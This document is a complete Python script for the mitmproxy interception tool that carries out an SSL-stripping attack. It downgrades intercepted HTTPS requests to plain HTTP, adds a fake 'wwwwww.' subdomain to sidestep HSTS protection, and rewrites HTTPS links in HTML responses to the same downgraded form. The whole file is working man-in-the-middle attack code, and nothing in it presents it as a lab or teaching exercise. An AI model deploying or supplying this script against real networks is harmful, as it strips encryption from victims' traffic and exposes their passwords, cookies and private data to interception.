from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    # Downgrade HTTPS to HTTP
    if flow.request.scheme == "https":
        flow.request.scheme = "http"
        flow.request.port = 80
        # Prepend custom subdomain to bypass HSTS
        flow.request.host = "wwwwww." + flow.request.host

def response(flow: http.HTTPFlow) -> None:
    # Modify the response content to downgrade any HTTPS links to HTTP
    if "text/html" in flow.response.headers.get("content-type", ""):
        flow.response.content = flow.response.content.replace(b"https://", b"http://wwwwww.")
